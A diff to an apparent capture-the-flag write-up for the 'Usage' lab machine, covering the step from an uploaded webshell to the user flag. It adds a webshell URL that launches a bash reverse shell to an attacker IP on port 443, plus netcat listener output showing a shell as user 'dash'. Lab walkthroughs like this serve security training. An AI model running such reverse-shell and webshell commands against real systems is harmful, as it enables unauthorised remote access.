@@ -509,7 +509,7 @@ Now we can browse our `webshell` and try to execute a `command`:
 
 <br />
 
-
+![17](../../../assets/images/Usage/17.png)
 
 <br />
 
@@ -524,7 +524,7 @@ To gain access to the system, we will use the typical bash `reverse shell`:
 <br />
 
 ```bash
-bash -i >%26 /dev/tcp/10.10.14.22/443 0>%261
+http://admin.usage.htb/uploads/images/cmd.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.22/443 0>%261'
 ```
 
 <br />
@@ -534,9 +534,27 @@ Check the listener:
 <br />
 
 ```bash
-
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.22] from (UNKNOWN) [10.10.11.18] 42414
+bash: cannot set terminal process group (1242): Inappropriate ioctl for device
+bash: no job control in this shell
+dash@usage:/var/www/html/project_admin/public/uploads/images$ id
+id
+uid=1000(dash) gid=1000(dash) groups=1000(dash)
+dash@usage:/var/www/html/project_admin/public/uploads/images$ cd 
+cd 
+dash@usage:~$ cat user.txt
+cat user.txt
+06d491f47ddd1055403cd67deexxxxxx
 ```
 
 <br />
 
-We're inside the system!
+We've got the user.txt flag!
+
+<br />
+
+# Privilege Escalation: dash -> xander
+
+<br />
